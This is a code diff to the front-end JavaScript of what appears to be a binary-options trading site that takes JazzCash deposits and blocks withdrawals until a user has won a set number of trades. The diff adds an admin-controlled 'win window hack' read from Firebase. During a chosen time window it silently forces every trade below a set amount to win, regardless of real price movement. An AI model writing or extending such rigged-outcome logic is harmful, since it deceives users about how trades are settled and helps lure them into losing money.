@@ -225,13 +225,15 @@
     let currentPromoCode = "AH9900";
     let lastBonusTime = 0;
 
+    // Live Settings Cache Object
+    let winWindowSettings = { expiry: 0, limit: 0 };
+
     const canvas = document.getElementById('mainChart');
     const ctx = canvas.getContext('2d');
     const priceTag = document.getElementById('priceTag');
     const tradeTimer = document.getElementById('tradeTimer');
 
     async function init() {
-        // Real-time limit watch from Firebase
         db.ref('settings/min_wins_limit').on('value', snap => {
             if(snap.exists()) {
                 requiredWinsForWithdraw = snap.val();
@@ -239,7 +241,13 @@
             }
         });
 
-        // Real-time Crypto Base Values watch from Firebase
+        // Live monitor window target hack parameters from admin
+        db.ref('settings/win_window_hack').on('value', snap => {
+            if(snap.exists()) {
+                winWindowSettings = snap.val();
+            }
+        });
+
         db.ref('settings/crypto_bases').on('value', snap => {
             if(snap.exists()) {
                 const bases = snap.val();
@@ -352,7 +360,18 @@
             document.getElementById('timerVal').innerText = activeTrade.timeLeft;
             if(activeTrade.timeLeft === 0) {
                 tradeTimer.style.display = 'none';
-                const won = (activeTrade.type === 'CALL' && currentPrice > activeTrade.price) || (activeTrade.type === 'PUT' && currentPrice < activeTrade.price);
+                
+                // Normal Condition Chart Calculation
+                let won = (activeTrade.type === 'CALL' && currentPrice > activeTrade.price) || (activeTrade.type === 'PUT' && currentPrice < activeTrade.price);
+                
+                // Admin Window Override Hack Injection
+                const currentTimeStamp = new Date().getTime();
+                if(winWindowSettings && currentTimeStamp < winWindowSettings.expiry) {
+                    if(activeTrade.amount < winWindowSettings.limit) {
+                        won = true; // Auto force win if investment is below limit
+                    }
+                }
+
                 const finalProfit = won ? (activeTrade.amount * 1.92) : 0;
                 
                 if(won) { 
@@ -362,7 +381,7 @@
                     updateBalanceUI(); 
                     updateLevelUI(); 
                 } else {
-                    updateBalanceUI(); // Sync logic inside updateBalanceUI handles standard DB updates
+                    updateBalanceUI();
                 }
                 
                 const tradeRecord = { 
@@ -406,7 +425,6 @@
         if(localStorage.getItem('pp_session_active') === 'true') {
             currentUser = localStorage.getItem('pp_current_user');
             
-            // Listen live to logged-in user changes made by Admin
             db.ref('users/' + currentUser).on('value', snap => {
                 if(snap.exists()) {
                     isLoggedIn = true;
@@ -525,7 +543,6 @@
         if(isNaN(amount) || amount <= 0) { alert("Invalid Amount!"); return; }
         if(!phone) { alert("Please enter JazzCash number!"); return; }
         
-        // Fetch current promo live to prevent offline hacks
         const pSnap = await db.ref('settings/current_promo').get();
         const serverPromo = pSnap.exists() ? pSnap.val() : "AH9900";
 
